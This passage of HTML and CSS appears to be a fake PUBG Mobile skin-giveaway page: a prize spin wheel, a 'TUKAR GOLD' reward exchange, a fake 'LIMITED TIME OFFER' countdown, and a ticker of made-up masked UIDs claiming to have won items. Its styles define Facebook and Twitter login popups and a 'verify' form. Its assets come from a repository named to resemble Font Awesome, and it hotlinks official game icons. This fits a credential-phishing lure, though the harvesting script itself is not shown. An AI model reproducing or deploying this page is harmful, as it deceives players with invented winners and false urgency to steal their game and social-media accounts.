			text-transform: uppercase;
			border: none;
			border-radius: 2px;
			outline: none;
			float: right;
		}

		.footer-copyright-icon {
			width: 85%;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
			display: block;
		}

		.footer-txt-copyright {
			color: #bdbdbd;
			font-size: 15px;
			font-family: Teko;
			text-align: center;
		}

		.footer-txt-copyrights {
			color: #bdbdbd;
			font-size: 16px;
			font-family: Teko;
			text-align: center;
		}

		.verify-box-navbar {
			background-size: 100% 100%;
			width: 93%;
			height: 19%;
			margin-left: auto;
			margin-right: auto;
			display: block;
		}

		.verify-box-navbar-description {
			width: 50%;
			margin-top: 50px;
			margin-right: 20px;
			color: #fff;
			font-size: 18px;
			font-family: Teko;
			font-weight: 500;
			text-align: left;
			float: right;
		}

		.verify-box-navbar-form {
			background-size: 100% 100%;
			width: 93%;
			height: auto;
			margin-top: 25px;
			margin-left: auto;
			margin-right: auto;
			display: block;
		}

		.verify-box-navbar-form input {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/verify-bg.png) no-repeat center center;
			background-size: 100% 100%;
			width: 95%;
			height: 40px;
			margin-left: 10px;
			margin-bottom: 4px;
			padding: 4px;
			padding-left: 10px;
			padding-right: auto;
			color: #f1f1f0;
			font-size: 15px;
			font-family: laza;
			font-weight: 500;
			border: 2px solid #232323;
			position: relative;
			outline: none;
			-webkit-appearance: none;
			-moz-appearance: none;
			border-radius: 15px;
		}

		.verify-box-navbar-form input::placeholder {
			color: #f1f1f0;
		}

		.verify-box-navbar-form select {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/verify-bg.png) no-repeat center center;
			background-size: 100% 100%;
			width: 95%;
			height: 40px;
			margin-left: 10px;
			margin-bottom: 4px;
			padding: 4px;
			padding-left: 10px;
			padding-right: auto;
			color: #f1f1f0;
			font-size: 15px;
			font-family: laza;
			font-weight: 500;
			border: 2px solid #232323;
			position: relative;
			outline: none;
			-webkit-appearance: none;
			-moz-appearance: none;
			border-radius: 15px;
		}

		.verify-box-content {
			background-size: 100% 100%;
			width: 93%;
			height: auto;
			margin-top: -1px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 15px;
			padding: 20px;
			padding-top: 0px;
			padding-bottom: 25px;
			display: block;
		}

		.verify-box-content-title {
			width: 95%;
			height: auto;
			margin-top: 10px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
			padding: 6px;
			color: #fff;
			font-size: 18px;
			font-family: laza;
			font-weight: 500;
			text-align: center;
			display: block;
		}

		.verify-box-content-title i {
			padding-top: 15px;
			padding-bottom: 15px;
			color: #f1f1f0;
			margin-top: 29px;
			font-size: 100px;
			text-align: center;
		}

		.verify-box-content button {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/submit.png) no-repeat center center;
			background-size: 76% 77%;
			width: 55%;
			height: 55px;
			margin-top: 10px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
			padding: 9px;
			padding-top: 8px;
			padding-left: 20px;
			padding-right: 20px;
			color: #030303;
			font-size: 19px;
			font-family: laza;
			font-weight: 500;
			text-align: center;
			border: none;
			display: block;
		}

		.about-box-content {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/aboutrules-sec.png) no-repeat center center;
			background-size: 100% 100%;
			width: 96%;
			height: 120px;
			margin-top: 10px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
			padding: 20px;
			padding-left: auto;
			padding-right: auto;
			float: center;
			color: #000;
			display: block;
		}

		.about-box-content-title {
			width: 95%;
			height: auto;
			margin-top: 10px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
			padding: 6px;
			color: #000;
			font-size: 18px;
			font-family: laza;
			font-weight: 500;
			text-align: center;
			display: block;
		}

		.about-box-content-title i {
			padding-top: 15px;
			padding-bottom: 15px;
			color: #000;
			font-size: 100px;
			text-align: center;
		}


		figure {
			margin: 0;
			padding: 0;
			overflow: hidden;
		}

		.itemShine figure {
			position: relative;
		}

		.itemShine figure::before {
			background: -webkit-linear-gradient(left, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, .3) 100%);
			background: linear-gradient(to right, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, .3) 100%);
			width: 50%;
			height: 100%;
			top: 0;
			left: -75%;
			position: absolute;
			z-index: 2;
			content: '';
			display: block;
			-webkit-transform: skewX(-25deg);
			transform: skewX(-25deg);
		}

		.itemShine figure::before {
			-webkit-animation: shine 2s infinite;
			animation: shine 2s infinite;
		}

		@-webkit-keyframes shine {
			100% {
				left: 125%;
			}
		}

		@keyframes shine {
			100% {
				left: 125%;
			}
		}

		.kanan {
			float: right;
		}

		.kiri {
			float: left;
		}

		.tengah {
			margin-left: auto;
			margin-right: auto;
			display: block;
		}

		::-webkit-scrollbar {
			display: none;
			width: 0px;
		}

		.twitter-load {
			background-size: 100% 100%;
			width: 93%;
			height: 388px;
			margin-top: 0px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 15px;
			padding: 20px;
			padding-top: 0px;
			padding-bottom: 25px;
			display: block;
		}

		.twitter-load-title {
			width: 95%;
			height: auto;
			margin-top: 70px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
			padding: 6px;
			padding-top: 90px;
			color: #fff;
			font-size: 18px;
			font-family: laza;
			font-weight: 500;
			text-align: center;
			display: block;
		}

		.twitter-load-title i {
			margin-top: 90px;
			padding-top: 15px;
			padding-bottom: 15px;
			color: #00acee;
			font-size: 50px;
			text-align: center;
		}

		.fb-load {
			background-size: 100% 100%;
			width: 93%;
			height: 304px;
			margin-top: -1px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 15px;
			padding: 20px;
			padding-top: 0px;
			padding-bottom: 25px;
			display: block;
		}

		.fb-load img {
			width: 50px;
			height: 50px;
			margin-top: 215px;
			margin-bottom: -55px;
		}

		.fb-load-title {
			width: 95%;
			height: auto;
			margin-top: 10px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
			padding: 6px;
			color: #999998;
			font-size: 18px;
			font-family: laza;
			font-weight: 500;
			text-align: center;
			display: block;
		}

		.fb-load-title i {
			margin-top: 200px;
			padding-top: 15px;
			padding-bottom: 15px;
			color: #999998;
			font-size: 30px;
			text-align: center;
		}

		.event-notification {
			width: 93%;
			height: 53px;
			padding: 7px;
			margin-right: auto;
			margin-left: auto;
		}

		.event-notification-txt {
			padding-top: 10px;
			padding-left: 34px;
			color: #dbff85;
			font-size: 16px;
			font-family: Teko;
			font-weight: 550;
			text-align: left;
			float: left;
		}

		.timer {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/bg_tip2.png) no-repeat center center;
			background-size: 65% 100%;
			width: 98%;
			height: 9%;
			margin-top: 296px;
			margin-right: 0;
			display: block;
			padding-top: 21px;
			text-align: center;
			font-size: 19px;
			font-family: 'laza';
			font-weight: 500;
			color: #feddae;
			font-style: oblique;
			text-shadow: 1px 1px 1px #000000;
			position: absolute;
		}

		.notifgift {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/bg_tip3.png) no-repeat center center;
			position: absolute;
			opacity: 100%;
			color: #feddae;
			text-shadow: 1px 1px 1px #000000;
			border-radius: 2px;
			background-size: 71% 100%;
			width: 97%;
			height: 23px;
			margin-top: 379px;
			padding-top: 4px;
			padding-right: 0px;
			text-align: center;
			font-size: 12px;
			font-family: laza;
			font-weight: 500;
			display: block;
		}

		.box-rewards {
			background-size: 105% 100%;
			width: 100%;
			height: auto margin-left:auto;
			margin-right: auto;
			margin-bottom: 10px;
			border: 0px solid #E29E53;
			border-radius: 5px;
			position: relative;
			display: block;
		}

		.box-item-rewards {
			width: 100%;
			height: auto;
			padding-top: 20px;
			margin-right: auto;
		}

		.item {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/point-card-bg.png);
			background-size: 100% 124%;
			width: 29%;
			height: 99px;
			margin: 3px;
			margin-bottom: 34px;
			display: inline-block;
		}

		.item .item-nominal {
			padding-right: 4px;
			color: #fff;
			font-size: 25px;
			font-family: DINMITTELSCHRIFTSTD;
			text-align: right;
			position: absolute;
		}

		.item img {
			width: 79%;
			height: 79%;
			margin-top: 4%;
			margin-bottom: 4%;
		}

		.item-label {
			color: #fff;
			font-size: 10px;
			font-family: DINMITTELSCHRIFTSTD;
			font-weight: 550;
			text-align: center;
			margin-top: -8px;
		}

		.item p {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/button.png);
			background-size: 100% 100%;
			width: 100%;
			height: 30px;
			padding: 3px;
			padding-top: 8px;
			color: #fff;
			font-size: 13px;
			font-family: DINMITTELSCHRIFTSTD;
			font-weight: 500;
			text-align: center;
			border: none;
			outline: none;
			margin-top: 3%;
			border-bottom-left-radius: 9px;
			border-bottom-right-radius: 9px;
		}

		.item p img {
			height: auto;
			border: none;
			position: absolute;
			margin-top: -1.5px;
		}

		.LabelCards_card_label_box__Hcfaa {
			box-sizing: border-box;
			left: 6px;
			overflow: hidden;
			position: absolute;
			right: 6px;
			top: 6px;
			z-index: 1;
		}

		.lazabox {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazabox.png);
			background-size: 100% 100%;
			width: 100%;
			height: 70%;
			margin-top: -230px;
			object-position: center;
		}

		.pd-giftbox {
			position: absolute;
			top: 41.8%;
			left: 64%;
			transform: translateX(-0.645rem);
		}

		.rtl .pd-giftbox {
			direction: ltr
		}

		.pd-giftbox>img:nth-child(1) {
			position: absolute;
			top: -43px;
			left: 25px;
			z-index: 2;
			width: 6.2rem;
			height: 4.92rem;
			transform: rotate(-18deg);
			transform-origin: 100% 100%;
			-moz-transform-origin: 100% 100%;
			-webkit-transform-origin: 100% 100%;
			-o-transform-origin: 100% 100%;
			animation: gift-box-hat-kf 5s infinite;
			-moz-animation: gift-box-hat-kf 5s infinite;
			-webkit-animation: gift-box-hat-kf 3s infinite;
			-o-animation: gift-box-hat-kf 3s infinite
		}

		.pd-giftbox>img:nth-child(2) {
			position: absolute;
			width: 7.29rem;
			height: 5.1rem;
		}

		@keyframes gift-box-hat-kf {
			0% {
				transform: rotate(0deg)
			}

			12.5% {
				transform: rotate(0deg)
			}

			25% {
				transform: rotate(-18deg)
			}

			37.5% {
				transform: rotate(-18deg)
			}

			50% {
				transform: rotate(0deg)
			}

			62.5% {
				transform: rotate(0deg)
			}

			75% {
				transform: rotate(-18deg)
			}

			87.5% {
				transform: rotate(-18deg)
			}

			100% {
				transform: rotate(0deg)
			}
		}

		.yun {
			position: absolute
		}

		.yun1_1 {
			width: 35px;
			height: 18px;
			left: 10px;
			top: 63px;
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun1_1.png) 0/100% 100% no-repeat
		}

		.yun1_2 {
			width: 19px;
			height: 12px;
			left: 10px;
			top: 130px;
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun1_2.png) 0/100% 100% no-repeat
		}

		.yun1_3 {
			width: 57px;
			height: 20px;
			left: 215px;
			top: 72px;
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun1_3.png) 0/100% 100% no-repeat
		}

		.yun2_1 {
			width: calc(136 / 1920 * 100vw);
			height: calc(61 / 1920 * 100vw);
			left: calc(93 / 1920 * 100vw);
			top: calc(141 / 1920 * 100vw);
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun2_1.png) 0/100% 100% no-repeat
		}

		.yun2_2 {
			width: calc(561 / 1920 * 100vw);
			height: calc(207 / 1920 * 100vw);
			left: calc(99 / 1920 * 100vw);
			top: calc(207 / 1920 * 100vw);
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun2_2.png) 0/100% 100% no-repeat
		}

		.yun2_3 {
			width: 68px;
			height: 25px;
			left: 293px;
			top: 19px;
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun2_3.png) 0/100% 100% no-repeat
		}

		.yun2_4 {
			width: 71px;
			height: 29px;
			left: 290px;
			top: 141px;
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun2_4.png) 0/100% 100% no-repeat;
		}

		.yun2_5 {
			width: 69px;
			height: 27px;
			left: 10px;
			top: 158px;
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun2_5.png) 0/100% 100% no-repeat
		}

		.yun2_6 {
			width: 58px;
			height: 28px;
			left: 263px;
			top: 88px;
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun2_6.png) 0/100% 100% no-repeat
		}

		.tab_rewards {
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/box.png);
			background-size: 100% 100%;
			width: 104%;
			height: 361px;
			margin-top: 90px;
			margin-right: -8px;
			margin-left: 10px;
			padding-top: 52px;
			align-content: center;
			float: inline-end;
			opacity: 120%;
		}

		.nom {
			position: absolute;
			padding-left: 387px;
			padding-top: 51px;
			color: #fff;
			font-size: 13px;
			font-family: dinm;
			font-weight: 550;
		}


		@media only screen and (max-width:600px) {
			.lazabox {
				background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazabox.png);
				background-size: 100% 100%;
				width: 100%;
				height: 70%;
				margin-top: -230px;
				object-position: center;
			}

			.box-rewards {
				width: 100%;
				height: auto;
			}

			.box-item-rewards {
				width: 100%;
				height: auto;
				padding-top: 20px;
				margin-left: auto;
				margin-right: auto;
			}

			.containerLanding,
			.containerHome {
				width: 100%;
				height: auto;
				margin-top: -3px;
				margin-bottom: 0px;
				border: none;
				border-radius: 0px;
				padding: 0px;
			}

			.slider-container {
				margin-top: -3px;
				border: none;
			}

			.laz-container {
				background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazback.jpg) no-repeat center;
				background-size: 100% 100%;
				margin-top: -150px;
				padding: 5px;
				width: 100%;
				margin-left: 0px;
				margin-right: 0px;
				height: 862px;
				position: relative;
			}

			.gallery-container {
				float: left;
				margin-top: -2px;
				width: 100%;
				height: auto;
				border: 0px solid #fff;
			}

			.box {
				width: 100%;
				height: 405px;
				margin-top: -45px;
				margin-bottom: -25px;
			}

			.box-item {
				width: 100%;
				margin-left: auto;
				margin-right: auto;
				padding-top: 1px;
			}

			.rewardpop {
				background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazlogin.png) no-repeat center center;
				background-size: 100% 100%;
				width: 400px;
				height: 200px;
			}

			.scroll {
				height: 400px;
			}

			.event-title {
				background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/slogan1.png) no-repeat center center;
				background-size: 100% 100%;
				width: 100%;
				height: 6%;
				margin-top: -99px;
				margin-left: -5px;
				display: block;
				position: absolute;
			}

			.event-title2 {
				background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/slogan2.png) no-repeat center center;
				background-size: 100% 100%;
				width: 100%;
				height: 14%;
				margin-top: -159px;
				margin-left: -5px;
				display: block;
				position: absolute;
			}

			.event-notification {
				width: 93%;
				height: 53px;
				padding: 7px;
				margin-right: auto;
				margin-left: auto;
			}

			.event-notification-text {
				padding-top: 11px;
				font-family: laza;
				font-size: 16px;
			}

			.footer {
				border-left: none;
				border-right: none;
				border-top: none;
				border-bottom: none;
			}

			.popup-box-wrapper {
				width: auto;
				margin-top: 60%;
			}

			.popup-box-wrapperz {
				width: 360;
				margin-top: 60%;
			}

			.popup-box-wrappers {
				width: 360px;
				margin-top: 60%;
			}

			.popup-box-item {
				width: 16%;
				height: 67px;
				margin-top: 38px;
			}

			.popup-box-login-fb {
				margin-top: 35%;
			}

			.popup-box-login-twitter {
				margin-top: 40%;
			}

			.link-box {
				margin-top: 40%;
			}

			.footer {
				background-position-y: calc(500 / 640 * 210vw);
			}

			.footer-socmed-box p {
				margin-top: 12px;
			}

			.event-notification {

				background-size: auto;
				background-size: 94% 100%;
				width: 85%;
				height: 48px;
				margin-left: auto;
				margin-right: auto;
				margin-top: -2px;
				margin-bottom: -82px;
				display: block;
			}

			.event-notification-txt {
				padding-top: 10px;
				padding-left: 34px;
				color: #dbff85;
				font-size: 16px;
				font-family: Teko;
				font-weight: 550;
				text-align: left;
				float: left;
			}

			.timer {
				margin-left: 0px;

			}

			.notifgift {
				margin-top: 379px;
			}

			.event-notification-timer {
				padding-top: 44px;
				padding-right: 28px;
				color: #dbff85;
				font-size: 27px;
				font-family: Teko;
				font-weight: 550;
				text-align: left;
				margin-bottom: 13px;
				float: right;
			}

			.alert-text {
				margin-top: -330px;
				margin-left: -6px;
				padding: 7px;
				color: #ffffff;
				text-align: center;
				font-size: 14px;
				font-family: laza;
				border: none;
			}

			.alert-text-mid {
				margin-top: 1px;
				padding: 7px;
				color: #f1f1f0;
				text-align: center;
				font: 25px;
				font-family: laza;
				border: none;
				margin-right: -2px;
				font-size: 19px;
			}

			.popup-box-bg {
				background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/popup-box-bg2.png) no-repeat center center;
				background-size: 100% 100%;
				width: 109%;
				margin-top: -12px;
				margin-left: -15px;
			}

			.s1_man1 {
				display: block;
				width: calc();
				height: calc();
				background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/m416.png) center/100% 100% no-repeat;
				position: absolute;
				top: 400px;
				left: calc(-80 /1920*100vw);
				bottom: calc(-23 /1920*100vw);
				animation: bounce_down 4s linear infinite;
				-webkit-animation: bounce_down 4s linear infinite
			}

			@-webkit-keyframes bounce_down {
				25% {
					-webkit-transform: translateY(-10px)
				}

				50%,
				100% {
					-webkit-transform: translateY(0)
				}

				75% {
					-webkit-transform: translateY(10px)
				}
			}

			@keyframes bounce_down {
				25% {
					transform: translateY(-10px)
				}

				50%,
				100% {
					transform: translateY(0)
				}

				75% {
					transform: translateY(10px)
				}
			}
		}

		.i {

			display: inline-flex;
			width: 8%;
			animation: anim 8.5s ease-in-out infinite;
			transform: translateY(-150%) rotate(0deg);

		}

		.n1 {
			animation-delay: 0.1s;
		}

		.n2 {
			animation-delay: 1.2s;
		}

		.n3 {
			animation-delay: 0.6s;
			margin-left: 280px;
		}

		.n4 {
			animation-delay: 1.4s;
			width: 10px;
		}

		.n5 {
			animation-delay: 0.4s;
			width: 10px;
			margin-left: 160px;
		}

		.n6 {
			animation-delay: 0.6s;
		}

		h1 {
			transform: rotate(-45deg);
		}

		@keyframes anim {
			0% {
				transform: translateY(-180%) rotate(0deg);
			}

			100% {
				transform: translateY(120vh) rotate(-360deg);
			}
		}

		.yun {
			position: absolute
		}

		.yun1_1 {
			width: 35px;
			height: 18px;
			left: 10px;
			top: 63px;
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun1_1.png) 0/100% 100% no-repeat
		}

		.yun1_2 {
			width: 19px;
			height: 12px;
			left: 10px;
			top: 130px;
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun1_2.png) 0/100% 100% no-repeat
		}

		.yun1_3 {
			width: 57px;
			height: 20px;
			left: 215px;
			top: 72px;
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun1_3.png) 0/100% 100% no-repeat
		}

		.yun2_1 {
			width: calc(136 / 1920 * 100vw);
			height: calc(61 / 1920 * 100vw);
			left: calc(93 / 1920 * 100vw);
			top: calc(141 / 1920 * 100vw);
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun2_1.png) 0/100% 100% no-repeat
		}

		.yun2_2 {
			width: calc(561 / 1920 * 100vw);
			height: calc(207 / 1920 * 100vw);
			left: calc(99 / 1920 * 100vw);
			top: calc(207 / 1920 * 100vw);
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun2_2.png) 0/100% 100% no-repeat
		}

		.yun2_3 {
			width: 68px;
			height: 25px;
			left: 293px;
			top: 19px;
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun2_3.png) 0/100% 100% no-repeat
		}

		.yun2_4 {
			width: 71px;
			height: 29px;
			left: 290px;
			top: 141px;
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun2_4.png) 0/100% 100% no-repeat;
		}

		.yun2_5 {
			width: 69px;
			height: 27px;
			left: 10px;
			top: 158px;
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun2_5.png) 0/100% 100% no-repeat
		}

		.yun2_6 {
			width: 58px;
			height: 28px;
			left: 263px;
			top: 88px;
			background: url(https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazcloud/yun2_6.png) 0/100% 100% no-repeat
		}
	</style>

	<div class="slider-container">
		<div class="navbar">
			<img class="navbar-logo" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/style-img/logo.png">
			<div class="navbar-right">
				<img class="navbar-shop" src="https://www.pubgmobile.com/en/images/nav_shop.svg">
				<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_language.svg">
				<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg">
				<div class="navbar-download"><img src="https://www.pubgmobile.com/en/images/nav_download.svg"></div>
			</div> <!--- navbar-right --->
		</div> <!--- Banner/Video --->
		<div class="header">
			<img src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/lazaheader/header.jpg" class="width: 100%;"></img>
		</div>
	</div> <!--- header --->
	</div>
	<div class="laz-home">
		<div class="laz-container" style="margin-top:-1px;">
			<div>
				<br>
				<br>
				<br>
				<br>
				<br>
				<div class="event-title" style="opacity: 100%;"></div>
				<div class="event-title2" style="opacity: 100%;"></div>
				<div class="timer">LIMITED TIME OFFER<br>ENDS IN: <i class="fa-solid fa-stopwatch fa-shake"></i><span id="timer1" style="animation: fade .6s infinite alternate;color: #ff2c2c;"></span></div> <!--- event-notification-timer --->
				<div class="notifgift">
					<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 3585****23 Exchange OLD MAN'S MASK</div>
					<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 5266****04 Exchange M1887 - MATA ELANG</div>
					<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 8284****33 Exchange M1887 - STERLING CONQUEROR</div>
					<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 3980****78 Exchange M1887 - ONI - SAKURA</div>
					<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 8582****2 Exchange AK47 - DRACO</div>
					<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 5766****890 Exchange M1887 - METEOR</div>
					<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 3538****27 Exchange M1887 - EMERALD POWER</div>
					<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 3340****71 Exchange M1887 - MATA ELANG</div>
					<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 6582****342 Exchange M1887 - ONEPUCHMAN</div>
					<div class="slider animated fadeIn"><i class="fa-solid fa-gift fa-bounce"></i>&nbsp;&nbsp;&nbsp; UID 3311****129 Exchange M1887 - EMERALD POWER</div>
				</div>
			</div> <!--- alert-text --->
			<div class="header">
				<div class="alert-wrapper">
					<div class="box">
						<div class="box-item">
							<div class="cont">
								<div class="cont spin_content" style="margin-top: -11px;margin-bottom: 38px;">
									<section class="container" id="js-lotto">
										<div class="square" data-order="0">
											<div class="nomin"></div>
											<div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg">
													<defs>
														<pattern id="gift1" patternUnits="userSpaceOnUse" width="100" height="100">
															<image xlink:href="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/reward/mat.png" x="-25" width="150" height="100"></image>
														</pattern>
													</defs>
													<polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift1)"></polygon>
												</svg></div>
										</div>
										<div class="square" data-order="1">
											<div class="nomin"></div>
											<div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg">
													<defs>
														<pattern id="gift2" patternUnits="userSpaceOnUse" width="100" height="100">
															<image xlink:href="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/reward/1.png" x="-25" width="150" height="100"></image>
														</pattern>
													</defs>
													<polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift2)"></polygon>
												</svg></div>
										</div>
										<div class="squar" data-order="5">
											<div class="nomin"></div>
											<div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg">
													<defs>
														<pattern id="gift3" patternUnits="userSpaceOnUse" width="100" height="100">
															<image xlink:href="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/reward/3.png" x="-25" width="150" height="100"></image>
														</pattern>
													</defs>
													<polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift6)"></polygon>
												</svg></div>
										</div>
										<div class="start squar__start-btn">
											<div class="nomin">×5</div>
											<div>
												<center>
													<o onclick="buka()" onmousedown="buka.play();"><img src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/laz-spin.png" width="80" height="80" id="js-start" style="animation: bounce .6s infinite alternate;width: 95px;height: auto;"></o>
												</center>
											</div>
										</div>
										<div class="squar" data-order="2">
											<div class="nomin"></div>
											<div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg">
													<defs>
														<pattern id="gift4" patternUnits="userSpaceOnUse" width="100" height="100">
															<image xlink:href="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/reward/matxsuit.png" x="-25" width="150" height="100"></image>
														</pattern>
													</defs>
													<polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift3)"></polygon>
												</svg></div>
										</div>
										<div class="square" data-order="4">
											<div class="nomin"></div>
											<div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg">
													<defs>
														<pattern id="gift5" patternUnits="userSpaceOnUse" width="100" height="100">
															<image xlink:href="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/reward/5.png" x="-25" width="150" height="100"></image>
														</pattern>
													</defs>
													<polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift5)"></polygon>
												</svg></div>
										</div>
										<div class="square" data-order="3">
											<div class="nomin"></div>
											<div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg">
													<defs>
														<pattern id="gift6" patternUnits="userSpaceOnUse" width="100" height="100">
															<image xlink:href="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/reward/6.png" x="-25" width="150" height="100"></image>
														</pattern>
													</defs>
													<polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift4)"></polygon>
												</svg></div>
										</div>
									</section>
								</div>
							</div>
						</div>

						<div class="tab_rewards blx" id="latest">
							<div class="exchanges fa-fade">TUKAR GOLD</div>
							<br>
							<center>
								<div class="balance">
									<img src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/reward/bgff/laza1.jpg">
									<div class="balance-nom">OUTFIT-MASTER S5</div>
									<div class="balance-detail">Exclusive Rewards</div>
									<button onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/reward/bgff/laza1.jpg">6000</button>
								</div>
								<div class="balance">
									<img src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/reward/bgff/laza2.jpg">
									<div class="balance-nom">AN94-EVIL HOWLER</div>
									<div class="balance-detail">Exclusive Rewards</div>
									<button onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/reward/bgff/laza2.jpg">5000</button>
								</div>
								<div class="balance">
									<img src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/reward/bgff/laza3.jpg">
									<div class="balance-nom">RABBITY PINK</div>
									<div class="balance-detail">Exclusive Rewards</div>
									<button onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/reward/bgff/laza3.jpg">5000</button>
								</div>
								<div class="balance">
									<img src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/reward/bgff/laza4.jpg">
									<div class="balance-nom">OLD MAN'S MASK</div>
									<div class="balance-detail3">Exclusive Rewards</div>
									<button onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://cdn.jsdelivr.net/gh/fontawesome-array/spinv1@main/img/reward/bgff/laza4.jpg">3000</button>
								</div>


								</section>
						</div> <!--- cont spin_content --->
					</div> <!--- box-item --->
				</div> <!--- box --->
			</div> <!--- container-box --->
